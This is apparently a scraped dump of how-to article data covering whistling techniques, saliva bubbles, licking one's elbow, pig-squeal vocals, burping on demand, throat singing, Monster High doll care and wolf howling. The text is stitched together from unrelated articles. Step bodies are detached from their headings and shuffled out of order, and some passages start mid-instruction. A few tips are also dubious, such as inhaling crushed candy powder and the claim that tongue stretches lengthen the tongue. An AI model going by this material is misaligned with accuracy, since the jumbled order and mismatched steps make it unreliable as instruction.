This ""smoke"" is produced because as you blow warm air, the water vapor molecules produced by your breath transfer energy to the colder air. This causes the water vapor molecules to move more slowly and bind together to form the fog of tiny droplets of liquid water, which is actually what you are producing."

Touch the tip of your tongue to the gums under your lower front teeth.,
When you have a sheet of saliva, pull your tongue back very slightly and at the same time start to raise it over the the lower teeth.,
With the lower lip area acting to keep the sheet from moving forward, curl the front of the tongue down slightly to slide it under the sheet and then simultaneously curve the very tip of the tongue up to capture it and slide it back onto the tongue.,
Blow the bubble off the tongue very gently.,
If you are ambitious enough, you can learn to blow the bubble above your head and catch it on your tongue and then blow the same bubble back out.

",How to Blow Saliva Bubbles," You are trying to create a ""sheet"" of saliva between the two.;
, Move it forward so that it touches just under the lower lip.

, If it doesn't pop, it will form a half bubble sitting on your tongue. This will require some monkeying around to get right, but like most directions, it sounds much harder or more complex than it actually is.

, Now, this is the most difficult part of this trick. you want to very gently push it onto your lower lip and then slowly out. It will take lots of practice. But, don't get tensed, you will slowly master it. You will likely have more that will pop than float out. Practice, practice, practice.

, Stretch your neck forward, chin out, as far as you can. Try to think of it like you're going to grab your elbow with your chin. This will help you get the most distance out of your stretch.

, If you've got the right build for it, you should be able to stretch your tongue to your elbow in this position.


If at this point, you can't touch your tongue to your elbow, stop. This stretch will get your elbow as close as possible to your mouth as possible. If you can't, it's because your upper arm is too long and no amount of stretching will make it happen. Don't risk hyperextending your shoulder by yanking on it too hard.

Try sucking in instead of blowing out.,
Adjust the height of your tongue.,
Keep trying.",How to Whistle With Your Tongue," This creates an air passageway along the roof of your mouth. Be sure not to allow any air to escape through the sides. By forcing air through this channel, you will able to produce a sharp whistle instead of breathy noises.


Position your tongue closer to the roof of your mouth by drawing the tip toward your bottom front teeth. Place the sides of your tongue alongside your molars. This will fatten your tongue, narrowing the air channel along your palette while simultaneously creating a wider gap at the front of your mouth through which to push the air.
The positioning here is crucial. To produce a whistle, you must force air around a sharp bend, which in this case is created by your front teeth and tongue. Forcing the air higher along your palette makes this bend even sharper.;
, This reinforces the sharp bend in the air passageway produced by your front teeth. Resist the urge to jut your lips out, which will produce a breathy sound.


Pout your lips outwards like you are kissing and form a small hole, smaller than the size of the circumference of a pencil. Your lips should be kind of hard and tense with lots of wrinkles – especially your bottom lip. It should protrude out a little more than your top lip.
Don't let your tongue touch the top or bottom of your mouth. Instead, let it hover in your mouth around the back of your front teeth.

, To whistle, the air needs to stay along this path – it cannot rest in the sides of your cheeks. If anything, they should be slightly caved in on the sides as the result of your pursed lips. Imagine sucking through a straw – that's the look you should have at all times.


When you inhale, it should be difficult to get your breath – that's how small the hole formed by your lips should be. You will then be able to control your breath through this hole, making it last much longer than you would if you were speaking or singing.

, Though you want the air passage along your palette to be narrow, too little space produces just as breathy a sound as too much. Similarly, you must work to find the ideal distance between the front of your tongue and your teeth. Once you strike a balance between these two, you will be able to move your tongue back and forth in your mouth to produce different pitches.


It's all with the tongue and the cheeks. When you ""blow"" air through your lips, the main problem is either you're blowing too much air or the pucker is not quite right.

, A larger pucker (larger 'o' shape) and more air will increase volume; a smaller 'o' and less air will make your whistle quieter. It's important to pucker, but not too much ; just enough to make a small 'o' with your lips.


Try blowing; and if there is a sound, move your tongue around to how and what position gives you the best tone and output. The pitch comes from the amount of volume (physical volume) in the cavity you create between the opening in your lips and the back of your throat. The smaller this is, the higher the pitch will be and thus the larger this cavity is, the lower the pitch will be. In other words, the closer your tongue is to your mouth, the higher the pitch you produce.

, There are many ways of modulating the pitch of your whistle with your tongue: you can slide it back and forth like one of those cane whistles (actually very much like one of those) or you can bend it up and down creating a smaller or larger space. As you get better, you can use your throat as well to expand this area and reach even lower notes.


The vibrato effect comes from moving your tongue back and forth very slightly to waver from two notes. As said before, it's all with the tongue and cheeks and practice. If you can whistle, whistle all the time.

, Some believe that it's a myth to say that wetting your lips is necessary to whistle while others swear by it. If you're having a hard time producing a whistle, try moistening your lips. Think of it as wetting your finger before you produce the sound around the rim of a glass.


By wetting, we don't mean drenched. Just moisten the inside of your lips with your tongue lightly, and get back to practicing. If there's a difference, this method may work for you.

, Some people have better luck sucking air in than blowing it out. However, for most people, this is much, much harder. That being said, the logistics of placing your tongue and mouth are the same; give it a go if the standard method is becoming frustrating.

, With the front of your tongue on the back of your front teeth, move it up or down just a smidge. Does it change the tone? Does one tone seem to be closer to whistling than another? Keep adjusting the very tip of your tongue until you find that one tone you can produce, no problem.


Once you find the right spot for the tip of your tongue, start experimenting with moving the middle of your tongue. This changes to air flow and will thus change your pitch. Once you find other pitches, it's just a matter of knowing which position correlates to which note.

, Whistling takes time to master. It might be a while before you find the right shape to make with your mouth or how much air you should blow out. Concentrate on making one flat tone before you go worrying about pitch or volume, too.


Ask a few friends how they do it; you may be surprised that they all have slightly different techniques. No one's mouth is the exact same shape and size, so it makes sense that we all have to whistle slightly different ways.

, First, wet your lips. You don't need a ton of spit dripping down your chin, just get your top and bottom lip a little wet. You could also drink some water if you prefer. Next, position your lips. There are several ways to do this:


The sound tends to be clearer and louder if you put your lips in a round O shape. It's often easier to make the O be a small O instead of a big, wide one.
The whistle is higher pitched and shriller if you form a broad, flat shape with your mouth.

, This is tricky at first, but if you keep practicing you'll soon make a decent sound.


Don't press your tongue against your teeth. That cuts off the airway for any sound to come through.
Curve your tongue slightly upwards, but don't let it touch the roof of your mouth. It also helps to curl your tongue a little bit at the sides, but not too much! Your cheeks should be sucked in, like if you were sucking a straw.

Purchase theatrical smoke creators.,
Create or buy toy cigarettes.,
Use Smarties.",How to Blow Smoke from Your Mouth Without Using a Cigarette2," There are a lot of products on the market for creating fake smoke on stage, one of which is called ""Pure Smoke."" This product is similar to an e-cigarette, but instead of inhaling the smoke, you can squeeze the trigger and it will generate vapor. This device takes AA batteries for its battery pack, which is connected to a long wire that reaches the squeezable trigger mechanism. The mechanism is made to be attached to your chest, but can be placed anywhere. A hose then runs from the mechanism to the dispenser tip, which you can place near your mouth so it would appear as if you are smoking.
Pure Smoke creates similar vapor to that of fog machines used on stage, but in lesser quantities.
When purchasing this product, you will receive 11 cartridges, which is about 850 puffs of smokes. It may be a little pricy to some, but it's effective!
Make sure when buying Pure Smoke that you are buying the kind specifically to create fog or fake smoke on stage. There are other types of pure smoke used for Hookah and electronic cigarettes, so you'll want to avoid those.

, These can be very useful if you are trying to trick someone and make them believe you are smoking a real cigarette. They can be purchased online, or you can create your own. The trick to these cigarettes is to blow out -- don't inhale.To make toy cigarettes, take a white piece of paper, roll it up, and tape it closed. Place cotton at one end and then pour a white powder into the other end. Now, blow from either end and it will look like you are smoking a cigarette!
Be aware that these cigarettes don't last very long. They allow you to make a few puffs of smoke, but because you are just making smoke with the powder inside the cigarette, you won't be able to use it for hours on end.

, A really unique way to create smoke is by using the powder that ground up Smarties create. You can do this by grinding up the candy and rolling it into a piece of paper like a toy cigarette, or you can use the wrapper.When using the wrapper, smash the Smarties inside the wrapper, keeping both sides wrapped and then open up one end and gently inhale the Smartie dust and breathe out.
Unlike the toy cigarettes, you will inhale the smoke from the Smarties, but make sure you don't take too deep of a breath. Try to keep the air in your mouth, not letting it go to the back of your throat and into your diaphragm.

While there are many other different whistling techniques out there, this one tends to be a fairly simple one to pick up and is thought by some to produce the loudest sound. Supposedly, a whistle made with this technique can be over 130 decibels when done right.;
, Moisten the top and bottom lip by running your tongue along both sides. Saliva does not need to be dripping down from the corners of your mouth, but your lips should feel notably wet.

Your lips should be mostly folded beneath your fingers at this point.The small hole in between your fingers and the bottom lip is the ""blowhole."" Without it, you would not be able to produce any sound.
Make sure that all other areas around the blowhole are airtight. If air escapes from any other position at the front of your mouth, you will not get a strong whistle.

, Inhale deeply through your nose and exhale through the blowhole created by your fingers and bottom lip. When done right, a loud, clear whistle should be heard.


Do not be discouraged if you do not get this right on your first try. For many people, it takes time and practice to master this whistling technique.
Typically, the more breath you breathe out, the louder the sound will be. Just make sure that the breath is focused and narrow, rather than being so strong that it escapes all over the place in one burst.

, For the majority of novice whistlers, there are four major stages or milestones involved when learning how to whistle loudly. For some, there is even an added fifth stage. Once you reach each milestone, there are different adjustments you should make in order to reach the next.


The first stage is the ""windy"" stage. At this point, you will hear the air blowing, but no actual whistling sound will be heard. The best thing to do during this stage is to go back through the steps required to whistle loudly and check yourself on each one. Make minor adjustments to each component, especially finger position and lip tension, until you reach the next stage.
The second stage is the ""jet engine"" stage. At this point, you will hear a sound similar to that of an idling jet engine. There will be something close to a whistle, but not quite piercing enough to qualify as an actual whistle. From here, it's mostly a matter of readjusting your fingers until you can get a clearer sound.
The third stage is the ""leaky whistle,"" during which a whistling sound can be heard, but it remains soft and airy. This is due to air leakage from outside the blowhole, so you will need to tighten the seals made by your tongue and lips.
The fourth major stage is the ""mastery whistle,"" during which a full-powered, clear whistle with no leakage can be heard.
The optional fifth stage is just a louder version of the mastery whistle. If your mastery whistle is clear but still soft, you might not be putting enough force or air behind it. Simple blow with a stronger exhale.

, Your lower lip should be taut. Do not simply push down on it with your fingers.


A good way to practice the right amount of tension on your lower lip is to practice pursing your lips as they need to be without using your fingers. Study the shape of your lips in the mirror and, when you can visibly see what appears to be a taut lower lip, commit the feeling of it to memory.
When it comes time to practice whistling with your fingers again, concentrate on the feeling of your lower lip and match it to the feeling you felt when observing your lips in the mirror.

, You will not be able to whistle loudly if your lips and fingers are dry. At the same time, you do not want to have so much saliva pouring out that it flies everywhere.


If you're a little on the dehydrated side and have a hard time keeping your lips moist, you can try wetting your fingers underneath a running faucet before practicing your whistle.
Also remember to re-wet your lips periodically as you practice since they may dry out before you master the technique.

, When you press your tongue against the loop of your fingers, there needs to be enough pressure to make your tongue bend upward.


Only the very tip of your tongue should bend up, not the entire thing.
Also, your tongue should feel somewhat strained as your press. Make sure that the majority of the pressing is done by your tongue and not by your fingers.

, The size of the blowhole will probably require the most adjustment and playing around. It needs to be wide enough to let air through without problem but not so wide that all the air can come gushing through at once.


There is little practical advice to give about how to check the gap left for the blowhole. All you can really do is fiddle around with it until you get something that works.

, Obviously, more air being forced through your blowhole means a louder noise. Too much air can actually cause the quality of your whistle to degrade, though.


If you force too much air out too quickly, you might and up causing the seal between your fingers and the rest of your mouth to weaken, letting excess air escape from around the blowhole instead of through it.
Make sure that any air you release is directed through the blowhole and nowhere else.
Note that the volume of air moving through the blowhole will essentially adjust the volume and pitch of your whistle once the rest of the technique is mastered.

, Lower your jaw a bit and pull back the corners of your mouth, stretching them so that they move back toward the direction of your ears. Keep your bottom lip taut against your lower teeth and fold the upper lip over the top row of teeth.


Your bottom teeth should no longer be visible. Your upper teeth can be, but it will likely be easier to produce a louder whistle if your upper teeth are.
If you need a little help, press your index and middle fingertips on either side of the mouth to draw back the lip. Do not insert the fingers into your mouth, though.
You can still produce a very loud whistle with this method, but you need to have greater control over the muscles involved in whistling, so it can be difficult to do.

, Fold your tongue back so that it ""floats"" in your mouth juts before the lower front teeth.


The front of your tongue should flatten itself against your teeth along the sides of your tongue. Keep your tongue folded inward toward the center to create a blowhole or sharply angled gap.
The sound will be created when air is forced out over the lower lip and lower teeth.

, Inhale deeply through your nose and exhale sharply, forcing the air through the space between your tongue and lower teeth. When done correctly, a clear whistle should be heard.


Start with a gentle blow of air until you can hear a low whistle. This will let you know that the technique is right.
Once you get the technique right, exhale with more force and more air to increase the volume.

Do tongue stretches to Try to make your tongue longer.,
Stretch your shoulders.,
Take deep breaths.",How to Lick Your Elbow3," It's not guarantee that you can make your tongue longer, but there are some proven techniques that work to strengthen the muscle of your tongue, making it stronger and possibly bigger.


Press the tip of your tongue behind your lower front teeth and roll the middle and back of your tongue forward. Smile in this position to stretch your tongue. Try to make space in the back of your mouth and in your throat, so that your tongue can move easily, rolling slowly out and relaxing slowly back in., Develop a shoulder stretch routine that works for you, building strength and flexibility in your shoulder blades. If you have tight muscles, you won't be able to do this, even if your arm is the proper length and you've got a Gene Simmons tongue.


Bring your arm over your head, putting one wrist on the top of your head. Grab your elbow with your other hand, pulling toward the opposite side. Hold this position gently until a count of 15 and then alternate arms.
Clasp hands behind your back and straighten your elbows slowly and repeatedly. Be gentle in this position, and go slowly. Try a set of 20.

, Taking a big lungful will raise your diaphragm and allow you to stretch your neck out further and makes licking your elbow easier.

Pucker your lips.,
Curl your tongue slightly.,
Begin blowing air over your tongue and through your lips.,
Experiment with the position of your tongue to produce other notes.",How to Whistle1," Pretend like you're about to give a kiss, and make your lips into a puckered shape. The opening in your lips should be small and circular.Your breath flowing through this opening will produce a range of notes.

Another way to get your lips in the right position is to say the word ""two.""
Your lips should not be resting against your teeth. Instead, they should be stretched slightly forward.
If your lips are quite dry, lick them before you begin whistling. This may help improve the sound you produce.;
, Curl the edges of your tongue slightly upward. As you begin whistling, you'll change the shape of your tongue to produce different notes.For beginners, rest your tongue against your bottom row of teeth. Eventually, you should learn to move the shape of your tongue to form different tones.

, Blow gently, slightly altering the shape of your lips and the curve of your tongue until you're able to produce a clear note. This may take a few minutes of practice, so don't give up too quickly. It might take a while.

Don't blow hard, just softly at first. You'll be able to whistle more loudly once you find the right form for your lips and tongue to take.
Wet your lips again if they dry out while you're practicing.
Pay attention to the shape of your mouth when you find a note. In what exact position are your lips and tongue? Once you find the note, keep practicing. Try blowing harder in order to sustain the note.

, Try pushing it slightly forward to produce higher notes, and lifting it from the bottom of your mouth for lower notes. Play around until you're able to whistle up and down the scale.


To produce lower tones, you'll notice your jaw is lower as well. Producing lower tones requires creating a bigger mouth area. You might even point your chin downward when whistling low notes.
Your lips will be slightly tighter when you're producing higher notes. You might lift your head up to whistle a high note.
If you're hissing instead of whistling, your tongue might be too close against the roof of your mouth.

Breathe in heavily to get the feeling of what is required to perform this technique.,
Try breathing in heavily again, adding a raspy quality to the inhale.,
Achieve correct lip and tongue placement to achieve different tones, the last step is to learn to ""pull"" in forcefully enough (still with the raspy quality mentioned before) to add a high-pitched squeal to the noise.,(The only steps that actually need to be performed are the third and fifth, but steps one and two help to further understand, and warm up to this vocal trick conceptually)

,

Try doing this without breathing out, if you'd like.",How to Pig Squeal (Bree)," (If your lungs hurt while you're doing this, stop immediately and find a different way to breath in heavily without hurting your lungs. stay on the safe side);
, The noise that comes out should sound something like the stereotypical asthma attack that you'd see on a TV show, or even the ghost in The Ring. After being able to create this harsh breathing noise, form different ""oh"", ""oo"" and ""ee"" vowels using your lips, and mouth while in breathing. Some can achieve a better tone by manipulating the sound with their tongue. This is done by moving the tongue into different positions within the mouth, most of which involve making contact with the roof of the mouth with the back of your tongue.

, You pull in like when your sucking on a straw. That's how it should feel, but a lot tighter. You may think that this means that a pig squeal is always high-pitched, but this is not so. If you change your mouth position, the pitch of the squeal will change accordingly. Forming the shape for an ""E"" or sometimes an ""A"" causes it to be higher in pitch, while forming an ""O"" will drop the pitch.

,, Just try to make your throat ""tighter"", and then breathe in. Use your vocal cords and make a ""raspy"" noise. You can also try to say the words ""Quee"" or ""Bree"" or any word that ends with ""ee"". After weeks of training you can say almost anything! WARNING! This WILL hurt your throat the first few times you do it, don't try too hard in the beginning. The more you do this the louder it will get. Don't try to impress people with it at first because your vocal chords are still developing and you might just have a little girl squeal.

, It is possible, but unlike the inhale, it must be done with a mic and over music. when making a deep growl at your next band practice, make a hard ""R"" sound and you will be amazed at the high pitch yell that comes out.

Pull back your lips.,
Draw your tongue back.,
Blow across your tongue and over your bottom teeth and lip.,
Experiment to produce more sounds.Changing the position of your tongue, cheek muscles, and jaw will produce a wide variety of whistle sounds.

",How to Whistle2," Your upper lip should be tight against your upper teeth, which may be slightly exposed. Your lower lip should be tight against your lower teeth, which should be fully covered. You mouth should look like you are smiling with no teeth. This positioning will create a very loud, attention-grabbing whistle of the sort you can use to hail a cab when your hands are full.


Use your fingers to set your lips into place until you get the positioning correct., Position it so that it is broad and flat, and hovering just behind your bottom teeth. There should still be a slight space between your tongue and bottom teeth, but don't let them touch.

, Direct your breath downwards towards your lower teeth. You should be able to feel the downward force of the air on your tongue. The air will flow at a sharp angle created by the top of your tongue and your upper teeth, downward across your lower teeth and lip. This produces a uniquely loud tone.


This whistle will require some practice and exercise. Your jaw, tongue and mouth will all be slightly strained when you whistle this way.
Try to broaden and flatten the tip of your tongue until you produce a loud, clear tone.
Remember that your tongue should float in your mouth more or less at the level of your bottom row of teeth.

Decide which fingers to use.,
Make an inverted ""v"" shape with your fingers.,
Place the tip of the ""v"" shape under your tongue.,
Close your lips over your fingers.,
Blow through the hole.",How to Whistle3," When you whistle with your fingers, you use them to hold your lips in place to make it possible to produce the clearest note you can. Every person should decide which fingers to use to create the best possible whistle. Your individual finger positioning will be determined by the size and shape of your fingers and mouth. Consider the following possibilities:


Using both your right and left index fingers.
Using both your right and left middle fingers.
Using your right and left pinkie fingers.
Using the thumb and middle or index finger of the one hand.

, Whichever combination of fingers you're using, put them together to make an upside-down ""v"" shape. The bottom of the ""v"" is where your fingers connect with your mouth.


Be sure to wash your hands before you put your fingers in your mouth

, The two fingers should meet just under your tongue, behind your back teeth.

, There should be a small hole right between your fingers.


Close your mouth tight over your fingers to ensure air only goes through the hole between your two fingers for a more concentrated sound.

, This technique should produce a loud, shrill sound perfect for calling your dog home or getting your friends' attention. Keep practicing until your fingers, tongue and lips are in the correct position to produce a strong sound.


Don't blow too hard at first. Gradually increase the strength of the air you blow until you make the right sound.
Try different finger combinations. You might not be able to whistle over certain fingers but other fingers might just be the right size to produce a sound.

, Your tongue should almost touch the roof of your mouth. Don't worry if it brushes it occasionally, just get comfortable with the position.

, Sing and hold a note, just one note, with your tongue in place. You will be playing with this note to create your overtones. Sing from your chest, getting as deep as you can.


Think of saying ""oo,"" (like the sound in the word ""cool"") with the deepest voice you can.

, Keeping the tip of your tongue on the roof of your mouth. Think of it as shifting between an ""R"" and an ""L"" sound with your tongue.

, Think of moving your mouth from an ""E"" sound to a ""U"" sound (""as if saying ""see you"" without the ""s""). This changes the shape of your lips and the ""resonance"" of your mouth (how sound bounces around inside).


Do this slowly.

, Everyone's mouth is a little different and there is no perfect formula for tongue position, mouth opening, or volume. Start with your basic ""oooo"" note, and then:


Place your tongue near the roof of your mouth in a ""r"" position.
Move your lips slowly between the ""E"" and ""U"" vowel sounds.
Slowly curl your tongue back and away from the your lips.
When you hear your overtones, stop moving your mouth and hold the tone.

You’re going to be sticking your hands in your mouth. Therefore, try to make sure you don’t have any type of residue on your fingers.;
, Twist your hand and turn your palm away from your face. Your thumb should be pointed downwards and tilted away from your face. Make a hook shape by curling your index finger. One way to make this shape is to pick up a bag with one finger. Your finger will naturally make a curve.Without this hook shape, it will be difficult to make a noise.


If this is too difficult to do with an index finger, you can try using your other fingers. Some people even use their thumbs to make this noise.

, Get a glass of water and drink it. This will ensure that your lips aren’t too dry. Putting more moisture on your lips will make it easier to make a pop sound.


You can use chap-stick or lip balm as well. You want to prevent dryness at all costs. Parched lips can be split quite easily!

, To do this, attempt to pronounce a word like toot or fruit. This is a good way to get your lips in the right place.The ""o"" shape should be big enough for your finger.

, Tighten your lips around your finger. Keep a hold on your finger with your lips.


Keep the position. Try to keep your lips in the same place. If you start to tire, stop for a moment. If your mouth position is incorrect, then it will be hard to make a sound. You may want to practice this before you start to do the trick.
A good way to maintain this posture is to pretend that you are holding something inside your mouth already.

, Yank your finger out of your mouth. Be careful not to do this too quickly. You don't want to hurt yourself! You may have to do this a few times before a sound is produced.


If no sound is coming out, try blowing out of your mouth while you do this.

, This is a great way to annoy and amuse your friends. Walk up to your friends, greet them, and then make the sound. Be prepared to hear laughter or cries to stop!


You can also do this individually. Sneak up behind one of your friends, and get next to their ears. Make the sound and run away. They will be completely confused.

, Once you’ve mastered this trick, you can use it to make a melody. Just repeat the sound till you have a consistent rhythm.


Body sounds have been used in music for a long time! For example, beatboxers make sounds with their mouths in order to imitate percussion.Try “playing” with one of your friends. You can make the sound and they can rap along. You both can also try making the sound at the same time.

, Ask one of your relatives if they want to see a fun trick. If they say yes, make the sound for them. They might be surprised or grossed out. You won’t know until you try it out!


If they say no, you can still do the trick, but you might get in trouble!

Keep your back upright.,
Drink a carbonated beverage to build up gas in your stomach.,
Swallow air.,
Burp.,
Learn to burp in one smooth motion.,
Try swallowing a lot of air, at first, until you effectively force yourself to burp.",How to Burp on Demand," Sitting or standing with your back straight ensures that your lungs are fully extended. Extending your lungs will allow you to push out more air, which will encourage burping as you exhale. Trying puffing out your chest as you exhale – this, too, may stretch your lungs and help the burps come more naturally., Carbonated drinks may include soda, kombucha, ginger ale, and mineral water. Carbonation essentially means that a drink is swirling with tiny air bubbles; thus, drinking soda is somewhat akin to swallowing air. A short time after drinking a carbonated beverage, air will build up in your stomach. This air must be expelled as gas in the form of a burp. You may need to wait a few minutes for the carbonation to take effect.


In this way, drinking a carbonate beverage can help calm an upset stomach. The air bubbles in a carbonated drink will rise up and churn against the walls of your stomach, triggering an uncomfortable distended feeling and making you feel like you need to burp. When you burp, you will relieve excess gas buildup in the digestive tract.Try drinking out of a can or bottle—rather than out of, say, a straw—to coax additional air to seep in as you drink.

, When you swallow air, your stomach needs to expel it as gas. If you practice the proper technique, you can learn to channel this gas into a mighty burp.You should be able to feel the pressure building at the bottom of your throat.


If you have a hard time swallowing air, try closing your mouth and pinching your nose shut. This may make it easier to intensively swallow the air that's trapped in your mouth.

, Once you have built up enough gas pressure in your stomach, you should be able to push it out as a burp. When you feel gas in your esophagus rising toward your throat, open your mouth and allow the air to escape from the back of your throat. Try moving your jaw up and down to create a bit of suction. You may need to move your head and mouth around to perfectly situate your jaw.The more air you swallow, the bigger the burp will be. Try to burp a couple of times to get as much air out as possible.

, Try to swallow air, then push it back out as a burp, all in one motion. Over time, you will learn to intentionally spasm your throat muscles into a smooth swallow-burp motion.

, Keep practicing the swallowing motion. You will feel the pressure building up in your stomach as the air collects and balloons. Eventually, you will feel an overwhelming urge to burp. Follow the urge, and feel yourself twitch your throat muscles to force the burp out. This is what it feels like to burp on demand.


As you get better at burping on demand, the process will become easier and much less painful. You won't need to swallow nearly as much air to generate a solid burp. Keep practicing, and you'll get there.

Try practicing in the shower, while you drive, or while the TV is on in the backDon't worry if you cannot hear the overtones at first. It is difficult to hear yourself singing overtones when you first begin, even if you are making them properly, because of the the resonance in your head.

, When they are first starting out, most people don't give enough power and energy behind their voice, To get the ""ooooo"" sound right, imagine you are trying to sing as someone squeezes your throat. Your voice will need to loud and forceful, and this will help you create overtones.After you master throat singing technique you can lower your volume and vocal power to something more comfortable.

, There is a difference between your ""chest voice"" and you ""head voice."" With you head voice, you usually sing at a higher pitch, and you can feel the sound coming from your throat. A chest voice feels ""resonant,"" and you can feel the vibrations along your upper chest.

, Once you can comfortably make sing with overtones, you can learn to make melodies by moving your lips and adjusting your base note. Open and close them like you were transitioning from an ""E"" sound to a ""U"" sound (""eeeeee &rarr: you).

, Throat singing is found in cultures from Alaska to Mongolia and South Africa. The Smithsonian museum has an incredible collection of videos from these cultures, as well as some tutorials for burgeoning throat singers.

, You don't want to be in the same outfit for two days, and neither does she! Buy her new clothes at a toy store or other shops. You could also use other doll clothes that fit. You can even try to make your own. Also have a container or such to keep her clothes in. You don't want to lose them.

, They need fresh air like we do. If you bring Draculaura outside, make sure she has a toy umbrella or ""sunscream"" on so she doesn't burn. If you bring Lagoona, make her wade in water.

, You are her mom, so you need take care of her. Give her food, baths, and basically follow these instructions to make sure she is a happy doll!

, She might get broken if you don't, or worse.

,, Where is home for your doll? In your drawers? Under your bed? Well. Imagine this, a nice house for you doll to sleep in at night, a place to have parties with friends, or just to eat pizza! Try making a house for your doll, all you need is a box, some glue, pens, and scissors. Use your imagination! If it's Gillington Webber's home, make it underwater, draw bubbles and coral, draw tiny fishes, or treasure chests and shipwrecks. If it's for Clawdeen Wolf, make a big round moon for her to howl at, or some dead trees to give it the full affect that she is in the woods at night.

, Fill it with furniture, and make sure there is a bathroom! You may also choose to give it a ""theme"". If you had Draculaura, you could make the walls black/pink, and make sure she doesn't have any windows. Design the house depending on what the doll is like.

, Style it to make sure it matches her outfits. You could even buy mini bows, or hair ties, to accessorize it for maximum cuteness.

, She might need one if she gets dirty. Even if she isn't visibly dirty, you should still wipe her with a wet cloth.

, Find or buy some nail varnish/polish remover and get some Q-tips. Dip the Q-tip into the nail varnish remover, but after you've done that screw the lid back on. It will help to stop it from tipping over and spilling everywhere. Take the wet Q-tip, and rub it on any part of the body, except the parts of the face (where the makeup or eyes and lips are, it will rub them off). Rub off any dirt or grime that has collected over time.

, If you have any spare doll clothes, why not give them a change of outfit. Imagine if you had to wear one item of clothing for your whole life? Not so fun, is it? But if you don't have Monster High clothing, try sewing/gluing some dresses or t-shirts. Then you could style it however you want!

, Use a small container of warm water and some dish soap or shampoo and clean them. Remove the clothes from the container and leave them out to dry. Pour out the dirty water and replace it with clean water., Hang the doll's head over the side of the container with its hair over the water and use the small cup to wet the doll's hair. Use a small drop of shampoo to clean the doll's hair. Rinse the hair with cold water. Smooth a small drop of conditioner into the doll's hair to help with detangling.

Don't scrub the dolls hair with the shampoo. Scrubbing can pull out the doll's hair. Instead gently smooth it through the doll's hair.

, If you have Venus McFlytrap or Robecca Steam, make them her roommates. If you are giving her a job, an architectural one would be a great choice as Rochelle is a gargoyle. Since Rochelle is a gargoyle from Scaris, make her posh, friendly and loyal to her friends (maybe you could even get her a house in Scaris or Garrott, Rochelle's boyfriend). If you are trying to act out her voice while playing with her, sound really posh and say ""Hello Garot! They are trashing our school.""


Feed Rochelle rock candy as it's her favorite food.
Give her a good pet (if she came with Roux, perhaps give Roux a little room and friends).

, Try not to get her near water as she will electrify all her friends along with it. Remember, Frankie is sweet, friendly and is voted to cure any friendship. This is her famous personality. Sometimes let her arm go loose but don't worry, it pops right back on.


Feed her anything you like, because she has said that everything she's tried is delicious.
If Frankie came with Watzit, make him bark and meow at random times.
Give her a boyfriend if you trust her.

, If you have this doll, don't forget she's a vegan, so she can't eat meat. Since Draculaura's a follower of the ghostly gossip, give her a phone so she can see the latest news on Spectra's blog. If you also have Clawdeen and Frankie, make them her ghoul friends forever (maybe you could make them a mansion and give them bunk-beds so they can be roommates or buy them a Barbie dream house to live in). If you have Count Fabulous make her look like a girl because Draculaura loves dressing him up.


Make sure her room is pink and black.
Don't keep her in the sun without sunscreen, as she is a vampire.

, Don't forget that as Clawdeen is a werewolf she howls at the moon so make sure you make her howl when the moon is up. Clawdeen only eats meat so give her things like hot-dogs, burgers, lamb, pork, horse, cow, pig and ribs. Make her loyal to her friends. If she came with Crescent, make sure you don't loose her as Clawdeen would be very upset. Clawdeen's a fierce fashionista and has an eye for fashion.


Make sure that when you turn of the light, Clawdeen goes crazy.
Make sure you buy clothes for her in case they get dirty. This goes for all Monster high Dolls.
Make sure to buy her sister.
Pair her up with her social group; Frankie and Clawdeen would be in the same group.

, Make sure she's most of the time in the water otherwise her skin will dry. Make Lagoona walk in shallow water and always give her baths. Always bring her to the beach (Lagoona loves water and playing on the sand). Make her the captain of swimming club.


Feed her seaweed and all the other things that a sea monster would eat.
Give her an under water pet.

, Since Abbey's a bit of a tomboy make her play sports such as snow boarding. Feed her yak, cheese and pancakes. Every time she touches something, make her turn it to ice.


If you're looking for a pet, a snow leopard or a mammoth would be good.
If she's looking for a job, why not try a snowboard instructor or a waitress?
Don't make Abbey flirt with any boys (she says is not honorable).

, Give her a room fit for a queen. Maybe you could use some Barbie dolls to use as servants. Let her boss people around. Make her the leader of the fearleading squad.


Feed her grapes.
For a pet, give her something that lives in the desert like a snake for example.

, Get her a lap-top and a phone so she an write the ghostly gossip. Let her swoop through walls and floors to find something juicy.


Feed her angel food cake.
For a pet give her any kind of animal only make it a ghost animal like a ghost giraffe.
If you also have Twyla make them friends.
Decorate her room in purple or black.

, Make her not want to have baths (cats hate water so do werecats). Make Cleo her rival. If you also have Melody and Persephone, make them ghoul friends forever. Let her boss people round.


Sometimes she might scratch the furniture.
For a pet, give her an animal in the cat family.

, Give her a computer. Make her raise up her hand every time in mad science with the right answer. Find a way to translate her zombie language. Make her the smartest ghoul. Make Cleo boss her around a lot.


Feed her brains and fast food.

Make sure your hands are cupped.,
Make the space between your thumbs smaller.,
Adjust your mouth position.,
Change the pitch of the note by blowing harder and opening your hands slightly.",How to Hand Whistle2," When you blow into them, you should feel the air pushing them apart as pressure builds up. If it does not, the air is leaking somewhere.


Take a deep breath and then exhale slowly and evenly into your hands. It should take 10-12 seconds to run out of air.

, If your hands are too far apart you will hear a deep, low exhaling sound as you breathe, almost like Darth Vader’s breath. You should hear a thin, high-pitched “whoosh” of air even if you don’t hear a whistle, so move your thumbs closer together to improve your sound.

, While blowing, slowly rotate your hands up and down. Many people put their mouths right up against the hole. You need to have small space open under your bottom lip, and your upper lip should seal any holes between your thumbs.

, You can always change the note you are trying to whistle. It all depends on how hard you are blowing and how tightly the back of the hand-cave is closed. If your palms open some, you will get a higher-pitched sound than when they're tightly shut. The more you open, the higher the sound will be.


There are, of course, limits to this, as opening too much will prevent any whistling at all.

Howl to find out if there are wolves nearby.,
Howl day or night.,
Decide whether you are howling alone or with a pack.,
Be careful.,
Listen to audio recordings of wolf howls if you can.,
Take a deep breath.,
Start howling slowly.,
Howl again.",How to Howl Like a Wolf," In the wild, wolves howl as a way of communicating with other wolves. However, wolves will often answer a sound that closely resembles an actual howl. Wildlife biologists use fake howling as a research tool to determine whether there are any wolves in a given area: they'll howl into the woods, then record the number of replies.Wolves howl as a territorial defense, as a social activity, and as a means of locating other members of the pack. In groups, wolves howl to motivate and rally one another to move or to hunt.Howl from a high place that is clear of trees. You want the noise to resonate!
If you have access to the Internet, research wolf ranges and populations in your area. Wolves are endangered, and their activity has been well-documented by wildlife biologists.;
, It is a common misconception that wolves only howl at the moon – and, indeed, that they only howl at night. Wolves actually howl most frequently around sunrise and sunset, when they are generally more active than other times of the day.If you are trying to get wolves to howl back at you, it may help to howl when they are most active.


